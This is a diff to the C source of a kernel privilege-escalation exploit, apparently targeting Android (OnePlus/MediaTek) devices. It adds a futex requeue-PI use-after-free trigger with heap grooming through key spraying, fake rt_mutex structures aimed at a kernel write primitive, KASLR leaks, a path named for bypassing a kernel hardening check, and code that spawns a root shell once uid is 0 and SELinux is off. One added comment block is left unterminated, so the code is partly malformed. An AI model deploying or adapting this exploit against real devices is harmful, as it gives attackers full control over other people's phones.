@@ -1,4 +1,6 @@
 #include "common.h"
+#include <fcntl.h>
+#include <unistd.h>
 
 uint32_t f_wait;
 uint32_t f_pi_target;
@@ -16,6 +18,12 @@ atomic_int consumer_success;
 atomic_int main_route_delay_usec;
 uint64_t kaslr_base;
 uint64_t kaslr_slide;
+uintptr_t g_entry_slot = 0;  // Cached entry slot for direct read primitive
+
+uintptr_t get_entry_slot_for_cpu(int cpu) {
+    (void)cpu;  // We only support the current CPU for now
+    return g_entry_slot;
+}
 
 #define DIRECT_WRITE_ATTEMPTS 3
 
@@ -166,6 +174,216 @@ void run_main_route_threads(void) {
   }
 }
 
+#ifdef BYPASS_KERNELSNITCH
+// RT mutex for pre-populating pi_waiters
+static uint32_t f_rt_owner = 0;  // Owner holds this
+static pthread_t rt_owner_thread;
+static pthread_t rt_waiter1, rt_waiter2;
+
+void *rt_owner_func(void *arg) {
+  // Lock the futex so waiters will block
+  futex_op(&f_rt_owner, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  pr_info("RT_OWNER: locked f_rt_owner\n");
+  // Hold it forever
+  while (1) sleep(1);
+  return NULL;
+}
+
+void *rt_waiter_func(void *arg) {
+  struct timespec ts = { .tv_sec = 60, .tv_nsec = 0 };
+  int ret = futex_op(&f_rt_owner, FUTEX_LOCK_PI, 0, &ts, NULL, 0);
+  pr_info("RT_WAITER: returned %d errno=%d\n", ret, errno);
+  return NULL;
+}
+
+// Pre-populate current_task->pi_waiters with 2 RT mutex waiters
+static void prepopulate_pi_waiters(void) {
+  // Start owner first - it locks f_rt_owner
+  pthread_create(&rt_owner_thread, NULL, rt_owner_func, NULL);
+  usleep(50000);
+  
+  // Now create 2 waiters - they will block on f_rt_owner
+  // This inserts them into owner's pi_waiters tree
+  pthread_create(&rt_waiter1, NULL, rt_waiter_func, NULL);
+  pthread_create(&rt_waiter2, NULL, rt_waiter_func, NULL);
+  usleep(100000);  // Let them block and insert into pi_waiters
+  
+  pr_info("PREPOP: created owner + 2 waiters\n");
+  pr_info("  f_rt_owner=%u (owner tid)\n", f_rt_owner);
+}
+
+// Owner thread - owns f_pi_target so PI chain can be established
+void *key_owner_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  
+  // Lock f_pi_target first - this makes us the owner
+  long ret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  pr_info("key_owner: locked f_pi_target, ret=%ld errno=%d\n", ret, errno);
+  
+  // Wait forever while holding the lock
+  while (1) {
+    sleep(1);
+  }
+  return NULL;
+}
+
+// Simple waiter for key-based approach - blocks on f_wait, gets requeued
+void *key_waiter_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  
+  int tid = (int)syscall(SYS_gettid);
+  atomic_store(&waiter_tid, tid);
+  
+  // Signal we're ABOUT to call futex (before entering kernel)
+  atomic_store(&waiter_ready, 1);
+  
+  pr_info("WAITER: about to block, f_wait=%u f_pi_target=%u\n", f_wait, f_pi_target);
+  
+  // Use syscall directly to ensure correct timeout handling
+  struct timespec timeout;
+  clock_gettime(CLOCK_MONOTONIC, &timeout);
+  timeout.tv_sec += 30;  // 30 second timeout from NOW
+  
+  // Block on f_wait, waiting to be requeued to f_pi_target
+  // This creates the rt_mutex_waiter in kmalloc-128
+  int ret = syscall(SYS_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 
+                    0,            // val = expected value (f_wait should be 0)
+                    &timeout,     // timeout
+                    &f_pi_target, // uaddr2 = target futex
+                    0);           // val3 unused
+  pr_info("key_waiter: FUTEX_WAIT_REQUEUE_PI returned %d errno=%d\n", ret, errno);
+  
+  atomic_store(&route_done, 1);
+  return NULL;
+}
+
+// Key reclamation version - uses add_key grooming
+// FUTEX_LOCK_PI path avoids oplus_root_check hook!
+// Write primitive: rbtree rebalance in rt_mutex_enqueue_pi
+void run_main_route_threads_keys(void) {
+  reset_main_route_state();
+
+  // For the key-based approach, we need a way to get current_task
+  // Since we can't easily read kernel memory, use a simpler approach:
+  // Point fake_lock to init_task which is always valid
+  // Then fake_lock->owner = init_task (which is valid but empty pi_waiters)
+  
+  // Use init_task as fake_task (known valid task_struct)
+  uintptr_t init_task_addr = canon_addr(SLIDE_INIT_TASK_IMAGE);
+  fake_task = init_task_addr;
+  
+  // fake_lock: use ENTRY_TASK[cpu] - 0x18 so owner points to current task
+  uintptr_t entry_task_ptr = canon_addr(ENTRY_TASK) + direct_root_cpu * 8;
+  fake_lock = entry_task_ptr - 0x18ULL;
+  
+  pr_info("Using init_task approach:\n");
+  pr_info("  fake_task=%016zx (init_task)\n", fake_task);
+  pr_info("  fake_lock=%016zx (entry_task-%p)\n", fake_lock, (void*)0x18);
+  pr_info("  entry_task_ptr=%016zx\n", entry_task_ptr);
+  
+  uintptr_t init_cred_addr = canon_addr(INIT_CRED_STATIC);
+  pr_info("TARGETS: init_cred=%016zx\n", init_cred_addr);
+  
+  // Pre-populate current_task->pi_waiters with RT mutex waiters
+  prepopulate_pi_waiters();
+
+  // Phase 1: DRAIN freelist BEFORE any UAF
+  extern int drain_freelist(uintptr_t, uintptr_t);
+  drain_freelist(fake_task, fake_lock);
+  
+  // Create owner thread - must own f_pi_target for PI chain
+  pthread_t owner;
+  SYSCHK(pthread_create(&owner, NULL, key_owner_thread, NULL));
+  usleep(100000);  // Let owner lock f_pi_target
+  
+  // Diagnostics
+  pr_info("FUTEX_STATE: f_wait=%u f_pi_target=%u\n", f_wait, f_pi_target);
+  pr_info("OWNER_TID: should match f_pi_target value\n");
+  
+  // Phase 2: Create waiter thread (will allocate in kmalloc-128)
+  pthread_t waiter;
+  SYSCHK(pthread_create(&waiter, NULL, key_waiter_thread, NULL));
+
+  // Wait for waiter to signal ready (ABOUT to call futex)
+  while (!atomic_load(&waiter_ready)) {
+    usleep(1000);
+  }
+
+  // CRITICAL: Sleep to let waiter actually enter kernel and block
+  // waiter_ready=1 means it's ABOUT to syscall, not blocked yet
+  usleep(100000);  // 100ms
+
+  // Now waiter is definitely blocked in kernel on f_wait
+  pr_info("PHASE2: waiter should be blocked in kernel, fake_task=%016zx\n", fake_task);
+  
+  // Trigger UAF - requeue waiter from f_wait to f_pi_target
+  // This moves the waiter to f_pi_target's wait queue (owner holds it)
+  // FUTEX_CMP_REQUEUE_PI: nr_wake=1, nr_requeue=1, cmpval=0 (f_wait should be 0)
+  int ret = syscall(SYS_futex, &f_wait, FUTEX_CMP_REQUEUE_PI,
+                    1,                    // nr_wake = 1
+                    (void*)(uintptr_t)1,  // nr_requeue = 1 (cast as pointer)
+                    &f_pi_target, 
+                    0);                   // cmpval = *f_wait should be 0
+  pr_info("UAF: FUTEX_CMP_REQUEUE_PI ret=%d errno=%d\n", ret, errno);
+  
+  if (ret == 1) {
+    // UAF HAPPENED! Waiter was freed INSIDE FUTEX_CMP_REQUEUE_PI
+    // The waiter struct in kmalloc-128 is now freed
+    // Only ONE free slot exists in kmalloc-128 (freelist was drained)
+    
+    pr_success("UAF: waiter freed inside kernel, ONE free slot exists\n");
+    
+    // PHASE 3: IMMEDIATELY spray reclaim key - MUST land in freed slot
+    // No other allocations between requeue return and this!
+    extern int spray_reclaim_key(uintptr_t, uintptr_t);
+    spray_reclaim_key(fake_task, fake_lock);
+    
+    // PHASE 4: Walk PI chain via FUTEX_LOCK_PI
+    // This reads our fake waiter from the key slot
+    // If rbtree rebalance happens, we get the WRITE!
+    pr_info("PHASE4: walking PI chain via FUTEX_LOCK_PI...\n");
+    
+    struct timespec ts = { .tv_sec = 2, .tv_nsec = 0 };
+    long walk_ret = syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 
+                            0, &ts, NULL, 0);
+    pr_info("FUTEX_LOCK_PI returned %ld errno=%d\n", walk_ret, errno);
+    
+    // Check result
+    usleep(100000);
+    int uid = getuid();
+    int enforce = 0;
+    FILE *f = fopen("/sys/fs/selinux/enforce", "r");
+    if (f) { char c; enforce = (fread(&c, 1, 1, f) && c == '1'); fclose(f); }
+    
+    pr_success("RESULT: uid=%d euid=%d selinux=%d\n", uid, geteuid(), enforce);
+    
+    if (uid == 0 && enforce == 0) {
+      pr_success("ROOT ACHIEVED!\n");
+      execl("/system/bin/sh", "sh", NULL);
+    }
+    
+    // Cleanup: unlock so owner can continue
+    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  } else {
+    pr_error("REQUEUE FAILED: ret=%d errno=%d\n", ret, errno);
+  }
+  
+  // Check result
+  usleep(100000);
+  int uid = getuid();
+  int enforce = 0;
+  FILE *f = fopen("/sys/fs/selinux/enforce", "r");
+  if (f) { char c; enforce = (fread(&c, 1, 1, f) && c == '1'); fclose(f); }
+  
+  pr_success("RESULT: uid=%d euid=%d selinux=%d\n", uid, geteuid(), enforce);
+  
+  if (uid == 0 && enforce == 0) {
+    pr_success("ROOT ACHIEVED!\n");
+    execl("/system/bin/sh", "sh", NULL);
+  }
+}
+#endif
+
 static int direct_read_boot_id_raw(unsigned char raw[16]) {
   char text[64];
   int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
@@ -237,8 +455,8 @@ static int direct_read_shape0_exact64_once(
   const uintptr_t b = SLIDE_RANDOM_BOOT_ID_DATA;
 
   /*
-   * Q1 是 KASLR 后的 image/data 地址，Q2 才是 direct-map 地址；因此这里
-   * 只要求 Q 为内核指针，具体地址域由两个调用者分别收紧。
+   * Q1 是 KASLR 后的 image/data 地址, Q2 才是 direct-map 地址；因此这里
+   * 只要求 Q 为内核指针, 具体地址域由两个调用者分别收紧.
    */
   if (!value || !write_idx || !is_direct_ptr(b) || !is_kernel_ptr(q) ||
       (b & 7) != 0 || (q & 7) != 0 || q > UINTPTR_MAX - 16) {
@@ -269,7 +487,7 @@ static int direct_read_shape0_exact64_once(
     return DIRECT_R64_RETRY;
   }
 
-  /* 子进程退出后，父线程必须先回到 CPU7，才能读取 CPU7 的 __entry_task。 */
+  /* 子进程退出后, 父线程必须先回到 CPU7, 才能读取 CPU7 的 __entry_task. */
   if (!direct_pin_verify_cpu(
           "after-shape0", name, attempt, idx, &cpu_after_trigger)) {
     return DIRECT_R64_FATAL;
@@ -457,6 +675,19 @@ static int run_direct_root_stage(void) {
              direct_root_cpu, percpu_base, percpu_slot);
     return 0;
   }
+  
+  // DIAGNOSTIC: Test read of INIT_CRED_STATIC (known non-zero value)
+  // This tests if the physical alias calculation is correct
+  {
+    uint64_t test_val = 0;
+    uintptr_t init_cred_static = INIT_CRED_STATIC;  // static address, no slide
+    pr_warning("DIAGNOSTIC: Testing read of INIT_CRED_STATIC=%016zx\n", init_cred_static);
+    int rr = direct_read_shape0_exact64_once(
+        init_cred_static, &test_val, "init_cred_test", 1, &write_idx);
+    pr_warning("DIAGNOSTIC: INIT_CRED read result: rr=%d value=%016llx (should be kernel ptr)\n", 
+               rr, (unsigned long long)test_val);
+    // If test_val is 0, the physical alias calculation is wrong
+  }
 
   uint64_t percpu_delta = 0;
   uintptr_t entry_slot = 0;
@@ -492,6 +723,7 @@ static int run_direct_root_stage(void) {
              direct_root_cpu);
     return 0;
   }
+  g_entry_slot = entry_slot;  // Save for read_mm_struct_from_task
   pr_success("direct entry_slot=%016zx cpu=%d delta=%016llx\n",
              entry_slot, direct_root_cpu,
              (unsigned long long)percpu_delta);
@@ -603,31 +835,30 @@ int run_exploit(int argc, char **argv) {
 
   pin_to_core(CORE);
 
-#ifdef USE_DIRECT_KASLR
-  /* OnePlus Nord 2: Use direct KASLR base from kallsyms */
-  /* This bypasses the pselect slide technique which returns garbage on this device */
-  pr_info("Using direct KASLR base from kallsyms (Nord 2 workaround)\n");
-  kaslr_base = ACTUAL_KERNEL_BASE;
-  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
-  pr_success("kaslr-direct pid=%d base=%016llx slide=%016llx\n",
-             getpid(), (unsigned long long)kaslr_base,
-             (unsigned long long)kaslr_slide);
-  pr_info("Kernel base: 0x%016llx\n", (unsigned long long)kaslr_base);
-  pr_info("KIMAGE_TEXT_BASE: 0x%016llx\n", (unsigned long long)KIMAGE_TEXT_BASE);
-  pr_info("KASLR slide: 0x%016llx\n", (unsigned long long)kaslr_slide);
-#else
-  /* Original pselect slide technique */
-  if (!slide_leak_kernel_base()) {
-    pr_error("slide kaslr leak failed\n");
-    return 1;
-  }
-#endif
 
   /*
-   * slide 的 skb 已经被子进程消费，KASLR 也已读回；在父进程中释放本代
-   * reclaim socket 与残留 mm pin，避免 direct worker 只关闭继承副本、
-   * 而父进程仍把旧 partial slab 保活。
-   */
+   * slide skb consumed by child, KASLR read back；release this generation in parent
+  /* Try perf-based KASLR leak first (works on MediaTek) */
+  uint64_t text_base = perf_leak_text_base();
+  if (text_base) {
+    kaslr_base = text_base;
+    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+    kaslr_done = 1;
+    pr_success("text-base-ok pid=%d text=%016llx slide=%016llx (perf)\n",
+               getpid(), (unsigned long long)kaslr_base,
+               (unsigned long long)kaslr_slide);
+  } else {
+    /* Fallback to direct KASLR base from kallsyms */
+    pr_info("Using direct KASLR base from kallsyms (perf fallback)\n");
+    kaslr_base = ACTUAL_KERNEL_BASE;
+    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+    pr_success("kaslr-direct pid=%d base=%016llx slide=%016llx\n",
+               getpid(), (unsigned long long)kaslr_base,
+               (unsigned long long)kaslr_slide);
+  }
+  pr_info("Kernel base: 0x%016llx\n", (unsigned long long)kaslr_base);
+  /* Release reclaim socket and residual mm pin, avoid direct worker only closing inherited copies, 
+   * while parent still keeps old partial slab alive. */
   close_reclaim_sockets();
   cleanup_page_prepare_state();
   page_base = 0;
